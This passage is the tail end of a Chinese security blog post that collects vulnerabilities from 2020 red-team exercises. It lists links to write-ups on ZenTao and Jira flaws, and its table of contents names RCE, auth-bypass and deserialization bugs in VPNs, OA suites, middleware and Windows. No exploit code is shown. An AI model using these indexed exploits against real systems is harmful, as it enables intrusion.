<p><a href="https://xz.aliyun.com/t/171/" target="_blank" rel="noopener">禅道9.1.2 免登陆SQL注入漏洞</a></p>
<p><a href="https://www.cnblogs.com/ly584521/p/13962816.html" target="_blank" rel="noopener">禅道 ≤ 12.4.2 后台管理员权限Getshell</a></p>
<p><a href="https://xz.aliyun.com/t/186" target="_blank" rel="noopener">禅道9.1.2 权限控制逻辑漏洞</a></p>
<p><a href="https://xz.aliyun.com/t/188" target="_blank" rel="noopener">禅道826版本一定条件getshell</a></p>
<p><a href="https://anquan.baidu.com/article/996" target="_blank" rel="noopener">禅道远程代码执行漏洞</a></p>
<p><a href="http://dwz.date/d2G5" target="_blank" rel="noopener">禅道11.6任意文件读取</a></p>
<h4 id="2、Jira"><a href="#2、Jira" class="headerlink" title="2、Jira"></a>2、Jira</h4><p><a href="https://caiqiqi.github.io/2019/11/03/Atlassian-Jira%E6%BC%8F%E6%B4%9E%E5%A4%A7%E6%9D%82%E7%83%A9/" target="_blank" rel="noopener">Atlassian Jira漏洞大杂烩</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1529135" target="_blank" rel="noopener">Jira服务工作台路径遍历导致的敏感信息泄露漏洞（CVE-2019-14994）</a></p>
<p><a href="https://www.cnblogs.com/backlion/p/11608371.html" target="_blank" rel="noopener">Jira未授权SSRF漏洞(CVE-2019-8451)</a></p>
<p><a href="https://www.cnblogs.com/backlion/p/11608439.html" target="_blank" rel="noopener">Atlassian JIRA服务器模板注入漏洞（CVE-2019-11581）</a></p>
<p><a href="https://xz.aliyun.com/t/7219" target="_blank" rel="noopener">CVE-2019-8449 JIRA 信息泄漏漏洞</a></p>
<p><a href="https://sploitus.com/?query=Jira#exploits" target="_blank" rel="noopener">Jira历史漏洞合集</a></p>
<h2 id="更新说明："><a href="#更新说明：" class="headerlink" title="更新说明："></a>更新说明：</h2><p>[2021.1.21更新数据库、邮件、项目管理部分] 参考：<a href="https://mp.weixin.qq.com/s/wiZJUQ6Un9UuE98YFBYWig" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wiZJUQ6Un9UuE98YFBYWig</a></p>
<p>[2020.10.27更新操作系统部分]</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、安全设备"><span class="toc-number">1.</span> <span class="toc-text">一、安全设备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、深信服-SSL-VPN-Nday-Pre-Auth-修改绑定手机"><span class="toc-number">1.0.1.</span> <span class="toc-text">1、深信服 SSL VPN Nday - Pre Auth 修改绑定手机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、深信服-SSL-VPN-Nday-Pre-Auth-任意密码重置"><span class="toc-number">1.0.2.</span> <span class="toc-text">2、深信服 SSL VPN Nday - Pre Auth 任意密码重置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、深信服SSL-VPN-远程代码执行漏洞-CNVD-2020-48679"><span class="toc-number">1.0.3.</span> <span class="toc-text">3、深信服SSL VPN 远程代码执行漏洞 CNVD-2020-48679</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、深信服-SSL-VPN-任意用户添加漏洞"><span class="toc-number">1.0.4.</span> <span class="toc-text">4、深信服 SSL VPN 任意用户添加漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、深信服-EDR3-2-21远程代码执行"><span class="toc-number">1.0.5.</span> <span class="toc-text">5、深信服 EDR3.2.21远程代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、深信服-EDR-任意用户登录漏洞-CNVD-2020-46552"><span class="toc-number">1.0.6.</span> <span class="toc-text">6、深信服 EDR 任意用户登录漏洞 CNVD-2020-46552</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、深信服-EDR-远程命令执行漏洞"><span class="toc-number">1.0.7.</span> <span class="toc-text">7、深信服 EDR 远程命令执行漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、绿盟UTS综合威胁探针管理员任意登录-密码泄露"><span class="toc-number">1.0.8.</span> <span class="toc-text">8、绿盟UTS综合威胁探针管理员任意登录&#x2F;密码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9、天融信TOPApp-LB负载均衡SQL注入漏洞"><span class="toc-number">1.0.9.</span> <span class="toc-text">9、天融信TOPApp-LB负载均衡SQL注入漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10、天融信数据防泄漏系统未授权修改管理员密码"><span class="toc-number">1.0.10.</span> <span class="toc-text">10、天融信数据防泄漏系统未授权修改管理员密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11、网御星云VPN老版本漏洞"><span class="toc-number">1.0.11.</span> <span class="toc-text">11、网御星云VPN老版本漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12、齐治堡垒机前台远程命令执行漏洞-CVND-2019-20835"><span class="toc-number">1.0.12.</span> <span class="toc-text">12、齐治堡垒机前台远程命令执行漏洞 CVND-2019-20835</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13、Aruba-Clearpass远程代码执行漏洞-CVE-2020-7115"><span class="toc-number">1.0.13.</span> <span class="toc-text">13、Aruba Clearpass远程代码执行漏洞 CVE-2020-7115</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14、PAN-OS远程代码执行漏洞-CVE-2020-2040"><span class="toc-number">1.0.14.</span> <span class="toc-text">14、PAN-OS远程代码执行漏洞 CVE-2020-2040</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#15、联软准入文件上传漏洞"><span class="toc-number">1.0.15.</span> <span class="toc-text">15、联软准入文件上传漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、OA"><span class="toc-number">2.</span> <span class="toc-text">二、OA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、通达OA11-6未授权远程代码执行漏洞"><span class="toc-number">2.0.1.</span> <span class="toc-text">1、通达OA11.6未授权远程代码执行漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、通达OA11-4-越权登录漏洞"><span class="toc-number">2.0.2.</span> <span class="toc-text">2、通达OA11.4 越权登录漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、通达OA11-5-多处SQL注入漏洞"><span class="toc-number">2.0.3.</span> <span class="toc-text">3、通达OA11.5 多处SQL注入漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、通达OA文件包含漏洞"><span class="toc-number">2.0.4.</span> <span class="toc-text">4、通达OA文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、用友GRP-u8-XXE-amp-SQL注入导致命令执行"><span class="toc-number">2.0.5.</span> <span class="toc-text">5、用友GRP-u8 XXE&amp;SQL注入导致命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、用友NC6-5反序列化漏洞"><span class="toc-number">2.0.6.</span> <span class="toc-text">6、用友NC6.5反序列化漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、致远A8任意文件写入文件上传漏洞"><span class="toc-number">2.0.7.</span> <span class="toc-text">7、致远A8任意文件写入文件上传漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、致远A8反序列化漏洞"><span class="toc-number">2.0.8.</span> <span class="toc-text">8、致远A8反序列化漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9、泛微e-cology某版本存在RCE漏洞"><span class="toc-number">2.0.9.</span> <span class="toc-text">9、泛微e-cology某版本存在RCE漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10、泛微云桥任意文件读取"><span class="toc-number">2.0.10.</span> <span class="toc-text">10、泛微云桥任意文件读取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、中间件-容器"><span class="toc-number">3.</span> <span class="toc-text">三、中间件&#x2F;容器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、Weblogic命令执行漏洞-CVE-2020-14645"><span class="toc-number">3.0.1.</span> <span class="toc-text">1、Weblogic命令执行漏洞 CVE-2020-14645</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Weblogic反序列化漏洞-CVE-2020-2551"><span class="toc-number">3.0.2.</span> <span class="toc-text">2、Weblogic反序列化漏洞 CVE-2020-2551</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、Weblogic反序列化漏洞-CVE-2020-2555"><span class="toc-number">3.0.3.</span> <span class="toc-text">3、Weblogic反序列化漏洞 CVE-2020-2555</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、WebSphere远程代码执行漏洞-CVE-2020-4450"><span class="toc-number">3.0.4.</span> <span class="toc-text">4、WebSphere远程代码执行漏洞 CVE-2020-4450</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、WebSphere远程代码执行漏洞-CVE-2020-4362"><span class="toc-number">3.0.5.</span> <span class="toc-text">5、WebSphere远程代码执行漏洞 CVE-2020-4362</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、WebSphere-存在XXE外部实体注入漏洞-CVE-2020-4643"><span class="toc-number">3.0.6.</span> <span class="toc-text">6、WebSphere 存在XXE外部实体注入漏洞 CVE-2020-4643</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、Apache-Tomcat文件包含漏洞-CVE-2020-1938"><span class="toc-number">3.0.7.</span> <span class="toc-text">7、Apache Tomcat文件包含漏洞 CVE-2020-1938</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、Apache-Tomcat-session持久化远程代码执行漏洞-CVE-2020-9484"><span class="toc-number">3.0.8.</span> <span class="toc-text">8、Apache Tomcat session持久化远程代码执行漏洞 CVE-2020-9484</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9、Nginx使用LemonLDAP-NG权限绕过-CVE-2020-24660"><span class="toc-number">3.0.9.</span> <span class="toc-text">9、Nginx使用LemonLDAP::NG权限绕过 CVE-2020-24660</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、框架"><span class="toc-number">4.</span> <span class="toc-text">四、框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA："><span class="toc-number">4.1.</span> <span class="toc-text">JAVA：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、Spring-MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398"><span class="toc-number">4.1.1.</span> <span class="toc-text">1、Spring MVC框架RFD攻击漏洞（反射文件下载）CVE-2020-5398</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Spring-Framework反射型文件下载漏洞-CVE-2020-5421"><span class="toc-number">4.1.2.</span> <span class="toc-text">2、Spring Framework反射型文件下载漏洞 CVE-2020-5421</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、Spring-Cloud-Config-Server目录遍历-CVE-2020-5410"><span class="toc-number">4.1.3.</span> <span class="toc-text">3、Spring-Cloud-Config-Server目录遍历 CVE-2020-5410</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、Spring-Cloud-Netflix-Hystrix-Dashboard-SSRF"><span class="toc-number">4.1.4.</span> <span class="toc-text">4、Spring Cloud Netflix Hystrix Dashboard SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、Apache-Cocoon-XML注入-cve-2020-11991"><span class="toc-number">4.1.5.</span> <span class="toc-text">5、Apache Cocoon XML注入 cve-2020-11991</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6、Apache-Shiro-权限绕过漏洞-CVE-2020-13933"><span class="toc-number">4.1.6.</span> <span class="toc-text">6、Apache Shiro 权限绕过漏洞 CVE-2020-13933</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7、Apache-Shiro身份验证绕过漏洞-CVE-2020-11989"><span class="toc-number">4.1.7.</span> <span class="toc-text">7、Apache Shiro身份验证绕过漏洞 CVE-2020-11989</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8、Apache-Dubbo远程代码执行漏洞-CVE-2020-11995"><span class="toc-number">4.1.8.</span> <span class="toc-text">8、Apache Dubbo远程代码执行漏洞 CVE-2020-11995</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9、Apache-Dubbo反序列化漏洞-CVE-2020-1948"><span class="toc-number">4.1.9.</span> <span class="toc-text">9、Apache Dubbo反序列化漏洞 CVE-2020-1948</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10、Apache-Dubbo反序列化漏洞-CVE-2019-1756"><span class="toc-number">4.1.10.</span> <span class="toc-text">10、Apache Dubbo反序列化漏洞 CVE-2019-1756</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11、Struts2远程代码执行漏洞-CVE-2019-0230"><span class="toc-number">4.1.11.</span> <span class="toc-text">11、Struts2远程代码执行漏洞 CVE-2019-0230</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12、Jackson-多个反序列化安全漏洞-CVE-2020-24616"><span class="toc-number">4.1.12.</span> <span class="toc-text">12、Jackson 多个反序列化安全漏洞 CVE-2020-24616</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13、Fastjson-lt-1-2-68-远程命令执行漏洞"><span class="toc-number">4.1.13.</span> <span class="toc-text">13、Fastjson &lt;&#x3D; 1.2.68 远程命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">4.2.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、ThinkPHP-3-x注入漏洞"><span class="toc-number">4.2.1.</span> <span class="toc-text">1、ThinkPHP 3.x注入漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、ThinkPHP-6-任意文件操作漏洞"><span class="toc-number">4.2.2.</span> <span class="toc-text">2、ThinkPHP 6 任意文件操作漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、Yii-2框架反序列化远程命令执漏洞-CVE-2020-15148"><span class="toc-number">4.2.3.</span> <span class="toc-text">3、Yii 2框架反序列化远程命令执漏洞 CVE-2020-15148</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、Fastadmin文件上传漏洞，危害级别：高危"><span class="toc-number">4.2.4.</span> <span class="toc-text">4、Fastadmin文件上传漏洞，危害级别：高危</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、thinkadmin-目录遍历-任意文件读取-CVE-2020-25540"><span class="toc-number">4.2.5.</span> <span class="toc-text">5、thinkadmin 目录遍历&#x2F;任意文件读取 CVE-2020-25540</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五、操作系统"><span class="toc-number">5.</span> <span class="toc-text">五、操作系统</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、Windows-NetLogon特权提升漏洞-CVE-2020-1472"><span class="toc-number">5.0.1.</span> <span class="toc-text">1、Windows NetLogon特权提升漏洞 CVE-2020-1472</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、永恒之蓝-MS17-17010"><span class="toc-number">5.0.2.</span> <span class="toc-text">2、永恒之蓝 MS17-17010</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#六、数据库"><span class="toc-number">6.</span> <span class="toc-text">六、数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、redis"><span class="toc-number">6.0.1.</span> <span class="toc-text">1、redis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、hadoop"><span class="toc-number">6.0.2.</span> <span class="toc-text">2、hadoop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、mysql"><span class="toc-number">6.0.3.</span> <span class="toc-text">3、mysql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、Mssql"><span class="toc-number">6.0.4.</span> <span class="toc-text">4、Mssql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5、Nosql"><span class="toc-number">6.0.5.</span> <span class="toc-text">5、Nosql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#"><span class="toc-number">6.0.6.</span> <span class="toc-text"></span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#七、邮件"><span class="toc-number">7.</span> <span class="toc-text">七、邮件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、Exchange"><span class="toc-number">7.0.1.</span> <span class="toc-text">1、Exchange</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、coremail"><span class="toc-number">7.0.2.</span> <span class="toc-text">2、coremail</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#八、项目管理"><span class="toc-number">8.</span> <span class="toc-text">八、项目管理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、禅道"><span class="toc-number">8.0.1.</span> <span class="toc-text">1、禅道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、Jira"><span class="toc-number">8.0.2.</span> <span class="toc-text">2、Jira</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#更新说明："><span class="toc-number">9.</span> <span class="toc-text">更新说明：</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&text=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&title=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&is_video=false&description=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2020HW漏洞合集&body=Check out this article: https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&title=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&title=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&title=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&title=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&name=2020HW漏洞合集&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://r17a-17.github.io/2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/&t=2020HW漏洞合集" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2020-2022
    R17a
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/download/">Download</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?05441306932d71b1dba39f817847ce3e";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->


</body>
</html>
